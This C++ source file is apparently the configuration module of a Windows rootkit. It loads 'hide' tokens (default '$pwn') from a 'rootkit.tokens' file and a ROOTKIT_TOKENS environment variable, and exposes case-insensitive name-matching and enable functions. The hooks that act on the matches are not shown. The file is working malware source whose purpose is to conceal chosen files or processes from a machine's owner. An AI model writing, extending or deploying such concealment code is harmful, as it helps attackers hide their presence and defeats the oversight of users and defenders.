#include "config.h"

#include <string.h>
#include <wchar.h>

namespace
{
	constexpr wchar_t kDefaultToken[] = L"$pwn";
	constexpr wchar_t kConfigFileName[] = L"rootkit.tokens";
	constexpr size_t kMaxConfigBytes = 4096;

	wchar_t g_tokens[Config::kMaxTokens][Config::kMaxTokenLength];
	size_t g_tokenLengths[Config::kMaxTokens];
	size_t g_tokenCount = 0;

	volatile LONG g_enabled = TRUE;

	void AddToken(const wchar_t* lpToken, const size_t length)
	{
		if (g_tokenCount >= Config::kMaxTokens || length == 0 || length >= Config::kMaxTokenLength)
			return;

		wmemcpy(g_tokens[g_tokenCount], lpToken, length);
		g_tokens[g_tokenCount][length] = L'\0';
		g_tokenLengths[g_tokenCount] = length;
		++g_tokenCount;
	}

	// Split a buffer on newlines / ';' / ',', trimming blanks and '#' comments.
	void AddTokensFromBuffer(const wchar_t* lpBuffer, const size_t length)
	{
		size_t start = 0;
		for (size_t i = 0; i <= length; ++i)
		{
			const wchar_t c = (i < length) ? lpBuffer[i] : L'\n';
			if (c != L'\n' && c != L'\r' && c != L';' && c != L',')
				continue;

			size_t s = start;
			size_t e = i;
			while (s < e && (lpBuffer[s] == L' ' || lpBuffer[s] == L'\t'))
				++s;
			while (e > s && (lpBuffer[e - 1] == L' ' || lpBuffer[e - 1] == L'\t'))
				--e;

			if (s < e && lpBuffer[s] != L'#')
				AddToken(lpBuffer + s, e - s);

			start = i + 1;
		}
	}

	void LoadFromEnvironment()
	{
		wchar_t lpBuffer[kMaxConfigBytes];
		const DWORD length = GetEnvironmentVariableW(L"ROOTKIT_TOKENS", lpBuffer, kMaxConfigBytes);
		if (length > 0 && length < kMaxConfigBytes)
			AddTokensFromBuffer(lpBuffer, length);
	}

	void LoadFromFile(HMODULE hModule)
	{
		wchar_t lpPath[MAX_PATH];
		const DWORD length = GetModuleFileNameW(hModule, lpPath, MAX_PATH);
		if (length == 0 || length >= MAX_PATH)
			return;

		wchar_t* lpLastSlash = wcsrchr(lpPath, L'\\');
		if (lpLastSlash == nullptr)
			return;

		const size_t remaining = static_cast<size_t>(lpPath + MAX_PATH - (lpLastSlash + 1));
		wcscpy_s(lpLastSlash + 1, remaining, kConfigFileName);

		const HANDLE hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (hFile == INVALID_HANDLE_VALUE)
			return;

		char lpRaw[kMaxConfigBytes];
		DWORD read = 0;
		if (ReadFile(hFile, lpRaw, sizeof(lpRaw) - 1, &read, nullptr) && read > 0)
		{
			lpRaw[read] = '\0';

			wchar_t lpWide[kMaxConfigBytes];
			const int converted = MultiByteToWideChar(CP_ACP, 0, lpRaw, static_cast<int>(read), lpWide, kMaxConfigBytes - 1);
			if (converted > 0)
			{
				lpWide[converted] = L'\0';
				AddTokensFromBuffer(lpWide, static_cast<size_t>(converted));
			}
		}

		CloseHandle(hFile);
	}
}

namespace Config
{
	void Initialize(HMODULE hModule)
	{
		g_tokenCount = 0;
		AddToken(kDefaultToken, ARRAYSIZE(kDefaultToken) - 1);
		LoadFromEnvironment();
		LoadFromFile(hModule);
		SetEnabled(true);
	}

	void SetEnabled(const bool enabled)
	{
		InterlockedExchange(&g_enabled, enabled ? TRUE : FALSE);
	}

	bool IsEnabled()
	{
		return InterlockedCompareExchange(&g_enabled, TRUE, TRUE) != FALSE;
	}

	bool Matches(const wchar_t* lpName, const size_t length)
	{
		if (lpName == nullptr)
			return false;

		for (size_t t = 0; t < g_tokenCount; ++t)
		{
			const size_t tokenLength = g_tokenLengths[t];
			if (tokenLength == 0 || length < tokenLength)
				continue;

			for (size_t i = 0; i + tokenLength <= length; ++i)
			{
				if (_wcsnicmp(lpName + i, g_tokens[t], tokenLength) == 0)
					return true;
			}
		}

		return false;
	}

	bool Matches(const wchar_t* lpName)
	{
		return lpName != nullptr && Matches(lpName, wcslen(lpName));
	}
}
